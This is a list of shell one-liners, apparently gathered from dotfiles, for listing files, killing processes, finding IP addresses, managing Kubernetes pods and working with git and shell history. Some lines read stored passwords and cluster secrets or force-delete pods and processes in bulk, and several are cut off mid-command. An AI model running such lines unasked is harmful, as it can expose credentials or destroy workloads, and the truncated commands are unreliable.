ls -lhF -I . -I .. ${colorflag} | tail -n +2; ls -lh -I . -I .. | head -n 1; ls -1 -I . -I .. | wc -l
ls -la | grep ^- | sort -nr -k 5 | more
ls -la | grep ^- | awk '{print \$9}' | grep ^\\\.
ls -lRa | grep ^- | sort -nr -k 5 | more
ls -lF | grep /;ls -lF | grep -v / | tail +2
ls -lAp --color | grep '^d' && ls -lA --color | grep '^-' && ls -lAp --color | grep '^l'
ls -lA | grep ^d | sed -r 's/.+[[:digit:]]{2}:[[:digit:]]{2}\s*(.+)/\1/g' | while read repo; do echo \$repo; cd \$repo; git pull; cd ..; done
ls -d */ | sort --random-sort | head -n1 | tee /dev/stderr
ls -d err.txt generated.file succ.txt .??* 2> /dev/null | xargs du -cs | sort -n | more
ls -ctrla | grep -v 4096 | grep -v 65 | tail -n-5
ls -ctrla | grep -v 4096 | grep -v 65 | tail -n-1
ls -c ~/Documents | grep '@home\|@mac\|@errands'
ls -ap | grep -v / | xargs -d '\n' wc -l | grep -Pv '\d\stotal'
ls -aR | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
ls -a | grep '^\.' | grep --invert-match '\.DS_Store\|\.$'
ls -R|grep :|sed -e 's/:$//;s/[^-][^\/]*\//--/g;s/^/ /;s/-/|/'
ls -R | grep : | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
ls -R | grep ':' | sed -e 's/://' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
ls -R | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//—/g' -e 's/^/ /' -e 's/-/|/'
ls -R | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
ls -R -p | grep -v '/$' | grep -v '\.' | grep .
ls -Hlrt *.@(r|R|rmd|Rmd)
ls -A | xargs -I{} du -sh {} | s -h | tail; du -sh
ls -A -Q | xargs du -sk | sort -rn | head -10
ls -1| gack -vi 'google|chrome' |while read line; do trash $line; done
ls -1lrt \!:1 | grep ^- | awk '{print $9}' | tail -1
ls -1R | grep -v ^$ | grep -v :$ | wc -l
ls -1F | fgrep '*' | sed -e 's/\*//' | pr -4 -t
ls -1 ~/.cheat/ | pick -K | xargs -I{} ccat ~/.cheat/{} --color=always | less
ls -1 | rgi readme | head | xargs $EDITOR
ls -1 | rgi readme --type file -i README | head | xargs nvim
ls -1 | grep .mp3 | egrep -o '^[^-]+' | while read i; do mkdir
ls -1 $scriptsdir/sounds | grep .mp3 | sed s/\.mp3/\ / | tr -d '\n'; echo
ls --color=always -F | grep '\/' | sed 's%/$%%g' | sort --ignore-case
ls *.go | xargs cat | sed -r '/^(\s*\/\/.*)?$/d' | wc -l
ls *.([cCfFhrR]|sh|[Ff]90|pcm)
ls *(.doc|.dcx|.pt|.ptx)*
lpass show -c --username \$(lpass ls | fzf | awk '{print \$(NF)}' | sed 's/\]//g')
lpass show -c --password \$(lpass ls | fzf | awk '{print \$(NF)}' | sed 's/\]//g')
lpass show -c --password $(lpass ls | fzf | awk '{print $(NF)}' | sed 's/\]//g')
lpass show -c --notes \$(lpass ls | fzf | awk '{print \$(NF)}' | sed 's/\]//g')
locate --regex '\\.c$' | shuf | head -1 | xargs pv -q -L 20
localip() {ifconfig | grep 'inet ' | tail -n 1 | awk '{print \$2}'};localip
ll node_modules | grep ^l && ll node_modules | grep ^l | wc -l
less ~/.pg_service.conf | grep -e '\[.*\]' | sed -E 's/\[(.*)]/\1/' | sort
len=${1:-$pass_length}; head -n1 /dev/urandom | base64 | tr -d -c [:alnum:] | cut -c1-$len
lein run 2>&1 | grep WARNING | grep -v already | cut -b 10-
launchctl list|grep UIKitApplication|awk '{print $3}'|xargs launchctl remove
launchctl list|grep UIKitApplication|awk '{print $3}'|xargs launchctl
launchctl list|grep UIKitApplication|awk '{print $3}'| xargs launchctl remove
launchctl list | grep UIKitApplication | awk '{print \$3}' | xargs launchctl remove
launchctl list | cut -f3 | grep -v Label | sort -u
la | xargs du -s 2> /dev/null | sort -nr | head -n 20
la | grep -v '~$' | grep -v '[.]sw[op]$' | grep -v '^d.*[.]$'
l | grep xiejunting | awk '{print \$9}' | xargs du -h --max-depth=0
l | grep -v ^d | grep -v ^t | wc -l
l *c|tr -s ' '|sed 's/^/\$\(SRC_DIR\)\//g'|tr '\n' ' ';echo
l *.([cCfFhrR]|sh|[Ff]90|pcm)
kubetail $(kubectl get po -n grez --no-headers | grep grez | grep -v cronjob | awk
kubectl logs \`kubectl get pods | grep fleet-control-center-api-server | grep -v redis | awk '{print \$1}'\` -c internal-api-server
kubectl logs \`kubectl get pods | grep fleet-control-center-api-server | grep -v redis | awk '{print \$1}'\` -c api-server
kubectl logs \`kubectl get pods | grep fleet-control-center-api-server | grep -v redis | awk '{print \$1}'\` -c admin-server
kubectl get pods | tail +2 | cut -d ' ' -f 1 | xargs -I % -n 1 -P 10 kubectl delete pod %
kubectl get pods | sed 1d | fzf +m | awk
kubectl get pods | head -n 2 | grep coderunner | awk
kubectl get pods | grep Running | grep api- | cut -d ' ' -f1
kubectl get pods -n kube-system | \\grep calico-node | awk ""{print \$1}"" | xargs kubectl -n kube-system delete pods
kubectl get pods -a | grep Evicted | awk '{print \$1}' | xargs kubectl delete pod --force --grace-period=0
kubectl get pods --sort-by=.status.startTime | tail -n +2 | tail -n 10 | tail -r
kubectl get pods --all-namespaces | sed 1d | awk '{print \$4}' | perl -ne 'chomp;\$data{\$_}++;END{printf \
kubectl get pods --all-namespaces -o jsonpath='{..image}' | tr -s '[[:space:]]' '\n' | sort | uniq -c
kubectl get nodes | sed 1d | fzf +m | awk
kubectl config view | grep password | uniq | cut -c 15- -
kubectl config get-contexts | tr -s ' ' | cut -d ' ' -f 2 | sort
kubectl -n tooling get pods | grep pano | grep -v build | grep -v worker
kubectl -n kube-system get secret -o json | jq -Mr '.items[] | select(.metadata.name | startswith(\
kubeEnv show && kubectl exec -it $(kubectl get pods -n infrastructure -oname | grep router | head -n 1 | sed 's:^.*/::') -n infrastructure -- bash
kill `ps aux | grep udFuse | grep -v grep | awk '{print $2}'`
kill `ps aux | grep lib64flash | grep chrom | awk -F' ' '{print $2}'`
kill `ps aux | grep faye | grep ruby | cut -c 16-22`
kill `ps aux | grep [n]emo | tr -s ' ' |cut -f 2 -d ' '` ; sleep 2 ; nemo &
kill `ps aux | grep 'beyond/bin/beyond' | grep -v 'grep' | awk '{print $2}'`
kill `ps -eH | grep $$ -B1 | grep jfbterm | sed -r
kill \`ps | grep firefox-bin | grep -v grep | awk '{print \$1}'\`
kill -USR2 `ps guwax | egrep js9Helper | egrep -v egrep | awk '{print $2}'`
kill -HUP `ps aux | grep 'unicorn master' | grep -v grep | awk '{print $2}'`
kill -9 `ps uax | grep famelung | grep wget | awk
kill -9 `ps uax | grep famelung | grep ssara_federated_query | awk
kill -9 `ps uax | grep famelung | grep python | awk
kill -9 `ps uax | grep famelung | grep perl | awk
kill -9 `ps uax | grep famelung | grep createBatch | awk
kill -9 `ps ax | grep tomcat | grep -v grep | awk '{print $1}'`
kill -9 `ps ax | grep node | grep meteor | awk
kill -9 `ps aux | grep 'SystemUIServer' | grep -v 'grep' | awk '{ print $2 }'`
kill -9 `ps auwx | grep tomcat | grep java | awk
kill -9 `ps -ef | grep jetty:run | grep -v grep| awk '{print $2}'`
kill -9 `ps -e | grep zoo | tail -n1 | awk '{print $1}'`
kill -9 `ps -aux | grep caddy | grep -v grep | awk '{print $2}'`
kill -9 \`ps -ef|grep -w 'tomcat' |grep -v grep|awk '{print $2}'\` ; cd /usr/linkapp/bin/tomcat-master; ./bin/startup.sh ; tail -f logs/catalina.out
kill -9 \${\$(sudo netstat -atnp 2>/dev/null|grep '::1:2318'|tr -s ' '|cut -d ' ' -f 7)/\/*/}
kill -9 //pid \`netstat -aon | grep 3000 | grep -P '(?<=LISTENING).*' -o | grep -P '\\d*' -o\` //f
kill -9 $(ps ax | grep rhq-server.properties | grep java | awk
kill -9 $(ps ax | grep cassandra | grep java | awk
kill -9 $(ps ax | grep AgentMain | grep java | awk
kill -9 $(ps aux | grep nvim | grep -v grep | awk '{print $2}')
kill -9 $(ps aux | grep jackdbus | head -1 | perl -pe 's/^.*?(\d+).*$/$1/g')
kill -9 $(ps aux | grep dgautam | grep -e process | awk '{ print $2 }')
kill -9 $(ps -efda | grep ssh | tail -n1 | awk '{print $2}')
kill -9 $(ps -ef | grep spring | grep -v grep | awk '{print $2}')
kill -9 $(lsof -i -n | egrep '\<ssh\>'|tr -s ' '|cut -d' ' -f2)
kill -9 $( ps aux | grep /Applications/SQLDeveloper.app/Contents/Resources/sqldeveloper/sqldeveloper/bin | grep -v grep | cut -c10-15)
kill -3 \$(ps x | grep '[e]lasticsearch' | xargs | cut -d' ' -f1)
kill $(ps | tail -n +2 | peco | awk
kill $(ps x | grep JapaneseIM.appex | grep System | awk
kill $(ps fax | grep tomcat | grep apache | awk '{print $1}')
kill $(ps aux|grep firefox|grep opt|grep -Eow [0-9]{5})
kill $(ps auxwww |grep chrome | head -1 |awk '{print $2}')
kill $(ps aux | grep 1080 | grep ssh | awk '{print $2}') 2>/dev/null; scselect -n default
kill $(ps aux | grep -i tesv.exe | grep -v grep | awk '{print $2}')
kill $(ps -ef | grep java | grep portal-pub | awk
kill $(ps -ax | grep konsole | grep grep -v | sed -e
kill $(ps -A | grep jekyll | head -1 | cut -d ' ' -f3)
kill $(pg mongo | grep 'MongoDB Compass' | head -1 | awk '{print $2}')
kcconf get-contexts | grep '*' | tr -s ' ' ' ' | cut -f 5 -d ' '
kbg po -a | grep Evicted | awk '{print $1}' | xargs kubectl delete pod
jrnl --tags | awk '{print \$1}' | dmenu | xargs echo
jq -c 'path(..)|[.[]|tostring]|join(\
jq '[.modules[0].outputs | to_entries[] | .value = .value.value] | from_entries '
jq '. | to_entries | map(.value.count=.key+1) | [.[].value]'
jps|grep -vE '\s+Jps\$'|awk '{print \$1}'|xargs kill
jps |grep -i ckcode |awk '{print $1}' |xargs kill -9
jps | peco | awk '{ print $0 }' | xargs kill -15
jps | grep sbt | awk '{print \$1}' | xargs --no-run-if-empty --verbose kill -9
jps | grep 'OracleIdeLauncher' | awk '{ print $1}' | xargs kill
journal.py $(ls $HOME/journal/[a-z-]*.journal 2>/dev/null | grep -v '[ ()]' | sed 's/^/--ignore /' | tr '\n' ' ')
jobs -l | grep ssh | $HOME/bin/getjobs | xargs kill -9
jls -N | tail -n +2 | cut -f2 -d' ' | xargs -I % ${sudo}pkg -j % upgrade -y
jctl -u sshd | grep Accepted | grepip | sq
ipconfig | grep -v 127.0.0.1 | awk '/IPv4/ { print $NF }' | sed -e 's/^/\t\t/'
ipconfig | grep -i 'IPv4 Address' | cut -b40- | grep '192.*'
ipconfig | grep -i 'IPv4 Address' | cut -b40- | grep '148.*'
ipconfig getifaddr $(ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active' | egrep -o -m 1 '^[^\t:]+')
ip link show | egrep -o '[0-9]*: .*:' | tr -d ' ' | cut -d: -f2
ip address | grep inet.*wlan0 | cut -d' ' -f6 | sed \
ip address | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -Eo '([0-9]*\.){3}[0-9]*'
ip addr | grep inet | tail -2 | head -1 && python3 -m http.server
ip addr | grep inet | awk '{ print $2; }' | sed 's/\/.*$//'
ip addr | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ip addr | grep 'inet ' | sed 's/^ //g' | grep -v '127.0.0.1'
ip addr show|grep inet|grep inet6|awk
ip addr show|grep inet|grep -v inet6|awk
ip addr show | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ip addr show | grep -E 'inet' | grep -m 1 global | cut -d\ -f6
ip addr show wlp5s0 | grep inet | awk '{ print $2; }' | sed 's/\/.*$//'
ip addr show wlp4s0 | grep inet | awk '{ print $2; }' | sed 's/\/.*$//'
ip addr show wlp2s0 | grep inet | awk '{ print \$2 }' | sed 's/\/.*$//'
ip addr show eth0 | grep inet | awk '{ print ; }' | sed 's/\/.*$//'
ip addr show eth0 | grep inet | awk '{ print $2; }' | sed 's/\/.*$//'
ip a | grep 192 | awk '{print \$2}' | cut -d '/' -f 1
ip a | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ip a | grep 'inet ' | sed -e 's/^.*inet //g' -e 's/\/.*//g' | grep -v '127.0.0.1'
ip -j a s|jq -c '.[]|select(.ifname|match(\
ip -j a s|jq '.[].addr_info[]|select(.family|match(\
ip -4 addr | grep 192 | sed 's/^[ \t]*//' | cut -d ' ' -f 2
ioreg -l | rg IOPlatformSerialNumber | cut -d= -f2 | sed 's/[ \
ioreg -l | grep IOPlatformSerialNumber | cut -f 10 -d' ' | cut -d'\
info bash -o -|shuf -n50|sed 's/ */ /g;s/^ //'|fmt -w 90
ifconfig|sed -n -e '/127.0.0.1/d' -e '/inet /p'|awk -F: '{print \$2}'|awk '{print \$1}'
ifconfig|grep inet|grep -v inet6|awk
ifconfig |grep 'inet '|grep -v 127|awk '{print \$2}'
ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active' | grcat /usr/local/share/grc/conf.ifconfig
ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active' | egrep -o -m 1 '^[^\t:]+'
ifconfig | grep tun0 -a1 | tail -1 | awk '{print \$2}'
ifconfig | grep inet\ | grep -v 127.0.0.1 | cut -d\ -f2
ifconfig | grep inet | tail -n 1 | awk '{ print $2 }'
ifconfig | grep inet | tail -1 | cut -d ' ' -f2
ifconfig | grep inet | sed -r 's/(prefix|netmask).*//g'
ifconfig | grep inet | head -1 | awk
ifconfig | grep inet | grep broadcast | cut -d' ' -f2
ifconfig | grep inet | grep broadcast | awk '{print \$2}'
ifconfig | grep inet | grep broadcast | awk '{ printf( $2
ifconfig | grep inet | grep broadcast | awk
ifconfig | grep inet | grep -v inet6 | awk '{print $2}'
ifconfig | grep inet | grep -v 127.0.0.1 | cut -d\ -f2
ifconfig | grep inet | awk '{ print $2; }' | sed 's/\/.*$//'
ifconfig | grep ether | tail -1 | awk
ifconfig | grep en0 -A 2 | grep inet | cut -c6-21
ifconfig | grep cast | cut -d':' -f2 | cut -d' ' -f1
ifconfig | grep 192 | sed 's/.*inet //' | sed 's/ netmask.*//'
ifconfig | grep 192 | awk '{print $2}' | tee >(pbcopy)
ifconfig | grep -i inet[^6] | cut -d: -f2 | cut -d' ' -f1
ifconfig | grep -Eo 'inet (addr:)?([0-9]+\.){3}[0-9]+' | grep -Eo '([0-9]+\.){3}[0-9]+' | grep -v '127.0.0.1'
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1';curl icanhazip.com
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' && dig +short myip.opendns.com @resolver1.opendns.com
ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ifconfig | grep -E 'inet\ \d+.*broadcast' | grep -Eo 'inet \d+\.\d+\.\d+\.\d+' | cat
ifconfig | grep -E '(^[a-z])|inet ' | grep -B 1 'inet '
ifconfig | grep -B3 active | grep 'inet ' | awk '{print \$2}'
ifconfig | grep -A1 wlp4s0|grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+' | head -n 1 && python3 -m http.server
ifconfig | grep 'int ' | grep -v 127.0.0.1 | cut -d\ -f2
ifconfig | grep 'inet' | grep -v '127.0.0.1' | cut -d\ -f2
ifconfig | grep 'inet' | grep -Fv 127.0.0.1 | awk '{print $2}'
ifconfig | grep 'inet' | cut -d: -f2 | awk '{print $1}'
ifconfig | grep 'inet addr:192.168.1.' | awk -F':' '{print \$2}' | awk -F' ' '{print \$1}'
ifconfig | grep 'inet addr:' | awk -F'inet addr:' '{ print \$2 }' | awk '{ print \$1 }'
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d\ -f2
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d' ' -f2
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d ' ' -f2
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | cut -d ' ' -f 2
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print \$2}'
ifconfig | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}'
ifconfig | grep 'inet ' | grep -v 127.0.0.1 |
ifconfig | grep 'inet ' | grep -v 127.0.0 | cut -d' ' -f 2
ifconfig | grep 'inet ' | grep -v '127.0.0.1' | cut -d' ' -f10
ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | sed -E 's/(netmask.+)$//;s/^.*inet //'
ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | cut -f2 -d ' '
ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | awk '{print \$2}'
ifconfig | grep 'inet ' | grep -Fv 127.0.0.1 | awk '{print $2}'
ifconfig | grep 'inet ' | cut -d ' ' -f2 | grep -v 127.0.0.1
ifconfig | grep 'inet ' | cut -d ' ' -f2 | grep -v '127.0.0.1'
ifconfig | grep 'inet ' | awk -F' ' '{print \$2}' | grep -v 127.0.0.1
ifconfig | grep 'inet ' | awk '{ print \$2 }' | awk -F: '{ print \$2 }'
ifconfig | grep '^\s*inet ' | grep -v 127.0.0.1 | cut -d' ' -f2
ifconfig | grep '^[a-z0-1]*:' | cut '-d:' -f1 | xargs -I {} ipconfig getifaddr {}
ifconfig | grep $WIRELESS -A8 | grep 'inet ' | awk '{print \$2}'
ifconfig | fgrep 'ens32' -A 1 | fgrep 'inet' | awk -F' ' '{print \$2}'
ifconfig | egrep -o 'inet (192.168|10.32).\d+.\d+' | cut -d ' ' -f2
ifconfig wlp4s0b1 | grep 'inet[^[:digit:]]' | sed 's/^.*addr://g' | cut -d ' ' -f 1
ifconfig wlp3s0 | grep -m 1 inet | sed 's/^.*inet addr://g' | sed 's/Bcast.*//g'
ifconfig wlan0 | grep 'inet ' | cut --delimiter=' ' -f12 | sed s/addr://
ifconfig eth0 |grep inet addr| sed s/^.*inet addr://g|cut -d -f 1
ifconfig eth0 | grep 'inet 地址:' | sed 's/^.*inet 地址://g' | cut -d ' ' -f1
ifconfig eth0 | grep 'inet addr' | sed 's/^.*inet addr://g'| cut -d ' ' -f1
ifconfig eth0 | grep 'inet addr' | sed 's/^.*inet addr://g' | sed 's/Bcast.*//g'
ifconfig eth0 | grep 'inet ' | sed 's/^.*地址://g'|cut -d ' ' -f1
ifconfig en1 | grep inet | grep -v inet6 | awk -F' ' '{print \$2}'
ifconfig en1 | grep inet | cut -d: -f2 | awk
ifconfig en0 | head -n 5 | tail -n 1 | cut -c 7-20
ifconfig en0 | grep inet | grep -v inet6 | cut -d ' ' -f2
ifconfig en0 | grep inet | grep -v inet6 | cut -c 7-16
ifconfig en0 | grep inet | grep -v inet6 | awk '{printf \
ifconfig en0 | grep inet | grep -v inet6 | awk '{print \$2}'
ifconfig en0 | grep inet | cut -d: -f2 | awk
ifconfig en0 | grep -w inet | awk '{ print \$2 }' | pbcopy
ifconfig en0 | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'
ifconfig en0 | grep 'inet ' | sed -e 's/:/ /' | awk '{print $2}'
ifconfig en0 | grep 'inet ' | awk '{print \$2}' | cut -d/ -f1
ifconfig -a | grep-o 'inet6\? \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | sed -e 's/inet6* //'
ifconfig -a | grep -o 'inet6\\? \\(\\([0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\.[0-9]\\+\\)\\|[a-fA-F0-9:]\\+\\)' | sed -e 's/inet6* //'
ifconfig -a | grep -o 'inet6\? \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | sed -e 's/inet6* //'
ifconfig -a | grep -o 'inet6 \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | sed -e 's/inet6 //'
ifconfig -a | grep -o 'inet addr:\(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | sed -e 's/inet addr://'
ifconfig -a | grep -o 'inet \(\([0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+\)\|[a-fA-F0-9:]\+\)' | sed -e 's/inet //'
ifconfig -a | grep 'inet ' | grep broadcast | awk '{ print $2 }' ; echo
ifconfig -a | grep 'inet ' | grep broadcast | awk '{ print $2 }'
ifactive | head -n1 | cut -d':' -f1 | xargs ipconfig getifaddr
ifactive | grep -E 'en.*:' | cut -d ' ' -f1 | tr -d ':'
if ps aux | grep -q '[s]pring'; then kill \$(ps aux | grep [s]pring | awk '{print \$2}'); else echo 'Spring not running'; fi
if [ `ps aux |grep vpnc|grep -v grep|awk '{print $2}'` ]; then echo 'Connected'; else echo 'Not connected'; fi
i3lock -t -i /home/thauvi_a/Pictures/wallpaper/`ls /home/thauvi_a/Pictures/wallpaper | head -$((RANDOM%$(ls /home/thauvi_a/Pictures/wallpaper | wc -w)+1)) | tail -1`
hub release -f '%T (%S) %n' --include-drafts | grep ' (draft)' | awk '{print $1}' | xargs -t -n1 hub release delete
hub ci-status -v | grep jenkins.futurelearn.dev | cut -f3 | xargs open -a /Applications/Google\ Chrome.app
hostname; /sbin/ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'
host -a google.com | grep Received | tr '#' ' ' | cut -d ' ' -f 5
histring -fE '^Comparing files .*|^diff .*' | histring -c yellow -fE '^\-.*' | histring -c green -fE '^\+.*'
history |cut -c 8- | sk | bash
history | ~/.dotfiles/bin/typealot-filter.rb | sort -rn | head -n 20
history | tr -s ' ' | cut -d ' ' -f3- | uniq
history | tail -r | peco | sed 's/^\ *[0-9][0-9]*\ *//g'
history | tail -n2 | head -n1 | awk '{$1=
history | tail -n2 | head -n1 | alias_maker
history | tail -n 200 | cut -c 8- | > commands.sh
history | tail -2 | head -1 | sed -E 's/^ +[0-9]+ +//g'
history | tail -2 | head -1 | cut -c 8-
history | tac | sort -uk 2 | command grep --color -iP
history | tac | less | peco
history | sort -uk 2 | sort -n | grep
history | sed 's/.*\\] //' | sort | uniq
history | grep -v lastcmd | tail -1 | cut -b 8-
history | fzf | cut -c 8- | pbcopy
history | dmenu -l 20 | awk '{print \$2}' | xargs echo
history | cut -f 2 -d ' ' --complement | sort | uniq
history | cut -c8- | sort -u | pick
history | cut -c 8- | uniq | grep
history | cut -c 8- | tail -n 1 | cat >> ~/.note && tail ~/.note
history | cut -c 8- | sort | grep --color
history | cut -c 7- | sort -u | grep
history | commands | sort -rn | head -n20
history | commands | sort -rn | head
history | awk '{a[$2]++}END{for (i in a){print a [i] \' \' i}}' | sort -rn | head
history | awk '{a[$2]++ } END{for(i in a){print a[i] ' ' i}}'|sort -rn |head -n 20
history | _commands | sort -rn | head
history 2 | head -1 | sed 's/^ *[0-9]* *//' | pbcopy
history 2 | head -1 | cut -d ' ' -f 4- | pbcopy
history 1| tr -s ' ' | cut -d' ' -f3- | grep
history 0 | topTypedHistory | sort -rn | head -20
history 0 | awk '{print \$2}' | stats | head
history -a; history -n; history > ~/.new_history.txt; echo '#\!/bin/bash' > commands.txt; echo | diff -u ~/.old_history.txt ~/.new_history.txt | grep -E '^\+' | grep -v '+++ b/' >> commands.txt
history -60 | sort -k2 | uniq -f2 | sort -bn
hi | sort -rn | cut -c 1-7 --complement | vi -
hg status | grep -e '^\\?' | sed 's/^\\?//' | xargs -t rm -f
hg st | hg diff | pygmentize -l diff | less
hg log --template '{rev} {node|short} {author|user}: {desc} ({date|age})\n'
hg log --template '{node|short} {desc|strip|firstline}\n' -l 20
hg log --template '{node|short} {desc|strip|firstline}\n' -l 10
heroku info -r heroku | head -1 | tr -d '=' | tr -d ' '
header location | query_param SAMLRequest | urldecode | base64 -D
head /dev/urandom | openssl md5 | sed 's/\(..\)/\1:/g' | cut -c1-17
head ../facturas.txt | ./mapper.py | sort -k1 | ./reducer.py
head -n10 /dev/urandom | uuencode -m - | head -n6 | tail -n5
head -n1 | cut -c 8-14 | tr -d '\n' | xc
head -c9 /dev/urandom | b64encode - | tail -2 | head -1
head -c32 /dev/urandom | openssl dgst -sha256 -binary -hmac $(xxd -p -l32 -c32 /dev/urandom) | base64 | cut -b-32
gws | cut -c4- | grep spec | xargs zeus rspec -f d
gst | grep deleted | cut -d : -f 2 | xargs git rm --cached
gst | grep deleted | awk {'print \$3'} | xargs git rm
gst | grep deleted | awk '{print \$3}' | xargs -I{} git rm {}
gs | grep modified | cut -d : -f 2 | xargs gvim
gs | grep modified | cut -d : -f 2 | xargs ${GEDITOR:-false}
gs --porcelain | grep UU | head -1 | awk
gs --porcelain | cut -d' ' -f 2 | fzf | xargs rm
gs --porcelain | cut -d' ' -f 2 | fzf | xargs git add
grep title | sed 's/>/>\\n/g' | egrep -v '<title>' | cut -d '<' -f 1
grep ^alias ~/.aliases | perl -pe 's/alias //;s/=/\t/' | sort | column -ts$'\t'
grep DATANET_ nginx/conf/nginx.conf | cut -f 4- -d _ | cut -f 1 -d \ | while read T; do grep \
grep /etc/puppet/modules /var/lib/puppet/state/last_run_report.yaml | awk '{print $2}' | awk -F/ '{print $5}' | sort -u
grep -w Host ~/.ssh/config | peco | awk '{print \$2}' | xargs -o -n 1 ssh
grep -w 'Host' ~/.ssh/config | peco | cut -f 2 -d ' ' | xargs -o -n 1 ssh
grep -vi user ~/.ssh/config | paste - - | sed 's/host /\t/I' | sed 's/\s*hostname / -> /I'
grep -v TotalTraffic /log/inexistence/app/deluged.log | grep -v 'Successfully loaded' | grep -v 'Saving the state' | tail -n300
grep -v TotalTraffic /etc/inexistence/01.Log/deluged.log | grep -v 'Successfully loaded' | grep -v 'Saving the state' | tail -n300
grep -v '^$\|^#' /etc/pacman.d/mirrorlist | awk '{print}' | awk -F '/' '{print}'
grep -l -r '<<<<<<<' $GREP_SEARCH_PATH | xargs grep -l -r '>>>>>>>' | xargs grep -l -r '=======' | xargs mvim -p
grep -i 'warning\|error\|alert\|critical'
grep -hr '^use ' lib |sort|uniq| cut -d ' ' -f 2
grep -e ^Host ~/.ssh/config | peco | cut -d' ' -f2 | xargs -o -n 1 ssh
grep -e '\[deleted\]' | awk '{print $5}' | sed 's/^origin\///' | xargs git branch --delete
grep -Ev '^[[:space:]]*$|^[#;]|^[[:space:]]*#|^[[:space:]]*//'
grep -Ev '^(;|#|//|$)'
grep -E 'wav$|flac$|mp3$|ogg$'
grep -E '\[ALPM\]\ installed|\[ALPM\]\ reinstalled' /var/log/pacman.log | sort -r | bat
grep -E 'Handlers|EV=' /proc/bus/input/devices | grep -B1 'EV=120013' | grep -Eo 'event[0-9]+'
grep -A1000 BEGIN_CHEAT_ALIAS ~/.bashrc | grep -B1000 END_CHEAT_ALIAS | grep -v cheatinfo | grep alias
grep -A1 map $HOME/.vimrc | sed '/[>my]$/{N;s!\n!!}' | grep map | sed -r 's!^.+\
grep -A 1 'base64 ' ~/tmux-histroy/rfile |tail -1 | sed 's/[ \t]*$//' |base64 -d
grep 'processor\|model name' /proc/cpuinfo;echo ''; cat /proc/meminfo | grep 'MemTotal' | awk '{print \
grep '^{' | jq -C '.' | sed -e 's/\\\\n/\\n/g' | sed -e 's/\\\\t/\\t/g'
grep 'SCF Done' | tr -s [:blank:] | cut -d ' ' -f 6 | gnuplot -e \
grep 'EMP2+EPCM' | tr -s [:blank:] | cut -d ' ' -f 3 | gnuplot -e \
grep 'E corr MP2(2)=' | tr -s [:blank:] | cut -d ' ' -f 10 | gnuplot -e \
grc cat /var/log/messages | grep -v 'wpa_supplicant\|dhclient\|wlan0: link state'
gpg --fingerprint | grep -A1 fing | sed -e '/^--$/d' -e 's/Key fingerprint =//g' -e 's/ *//g' -e ':a' -e 'N' -e 's/\nuid/ \# /g' | tr -s ' '
go test 2>/dev/null | egrep -v 'EOF|connection|broken'
gnt-job list --no-headers --error | tee /dev/tty | awk '{print \$1}' | xargs -I{} gnt-job archive {}
git-checkout-default &>/dev/null && git branch -vv | grep 'origin/.*: gone]' | awk '{print \$1}' | xargs git branch -d
git tag | grep staging- | sort -r | head -n 1
git tag | grep -E 'humblebundle-[0-9]{4}' | sort | tail
git status|grep modified|awk '{print \$3}'|xargs git add
git status|grep deleted|awk '{print \$3}'|xargs git rm --cached
git status|grep 'modified:' | awk '{print \$2;}' | xargs -I} ~/bin/phpcs --standard=~/src/xdmod/phpcs.xml }
git status|grep 'modified:' | awk '{print \$2;}' | xargs -I} php -l }
git status |percol |awk '{print \$NF}' |xargs -I {} git diff {}
git status |peco |awk '{print \$NF}' |xargs -I {} git add {}
git status |grep deleted|awk '{print \$3}'|xargs git rm
